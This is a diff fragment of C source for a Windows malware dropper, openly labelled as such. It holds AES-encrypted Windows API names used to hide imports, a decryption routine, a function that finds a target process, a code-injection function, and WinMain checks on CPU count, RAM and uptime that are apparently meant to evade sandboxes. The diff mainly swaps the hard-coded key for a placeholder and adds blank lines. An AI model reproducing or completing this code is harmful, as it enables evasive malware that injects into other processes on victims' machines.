@@ -35,7 +35,7 @@ Going back to our dropper we will implment the following:
 
 
 
-
+ 
  
 
 
@@ -170,13 +170,17 @@ BOOL (WINAPI * pWriteProcessMemory)(
 LPVOID (WINAPI * pLockResource)(
   HGLOBAL hResData
 );
-//AES global encryption key 
-	char key[] = { 0x46, 0x69, 0x6c, 0x69, 0x70, 0x70, 0x6f, 0x32, 0x30, 0x32, 0x31 }; //
-	//c=aesenc("VirtualAlloc\x00","Filippo2021")
+
+//AES global encryption key used for payload and strings
+	char key[] = { 0x32, 0x31, 0x66 }; //
+	
+	//c=aesenc("VirtualAlloc\x00","addyourkey")
 	//print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in c) + ' };')
 	//payload[] = { 0x84, 0x57, 0x6b, 0x9e, 0x5b, 0x9c, 0xa6, 0x98, 0xd3, 0x47, 0xfc, 0xd6, 0x6, 0xea, 0x85, 0x3e };
 	unsigned char sLockResource[] = { 0x62, 0x63, 0xa5, 0x66, 0x92, 0x53, 0xbe, 0xd1, 0xf1, 0x35, 0x41, 0x9, 0xf4, 0x22, 0xbd, 0x8f };
 	unsigned char sWriteProcessMemory[] = { 0xac, 0x3c, 0xa9, 0x7f, 0x9, 0x25, 0xe2, 0x98, 0x6b, 0xa8, 0xa7, 0xab, 0xb5, 0xf, 0x87, 0x8d, 0xd8, 0x5b, 0x37, 0xf3, 0xa2, 0xd5, 0x93, 0x94, 0xd7, 0xfd, 0xac, 0xc6, 0x40, 0xc4, 0xf9, 0x13 };
+
+
 //AES ENC
 int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
         HCRYPTPROV hProv;
@@ -203,6 +207,7 @@ int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keyl
         CryptDestroyKey(hKey);
         return 0;
 }
+
 //Process injection search for process
 int Find(const char *procname) {
         HANDLE hProcSnap;
@@ -225,7 +230,9 @@ int Find(const char *procname) {
         CloseHandle(hProcSnap);   
         return pid;
 }
-//Do the actual code injections stuff
+
+//Do the actual code injections 
+
 int m4(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
         LPVOID pRemoteCode = NULL;
         HANDLE hThread = NULL;	
@@ -242,21 +249,26 @@ int m4(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
         return -1;
 }
 //Declare actual main win Function
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
 	// check CPU
 	SYSTEM_INFO systemInfo;
 	GetSystemInfo(&systemInfo);
 	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
 	if (numberOfProcessors < 2) return 0;
+	
 	// check RAM
 	MEMORYSTATUSEX memoryStatus;
 	memoryStatus.dwLength = sizeof(memoryStatus);
 	GlobalMemoryStatusEx(&memoryStatus);
 	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
 	if (RAMMB < 2048) return 0;
+	
 	//check uptime 
 	ULONGLONG uptime = GetTickCount64() / 1000;
 	if (uptime < 1200) return 0; //20 minutes
+	
 	void * exec_mem;
 	BOOL rv;
 	HANDLE th;
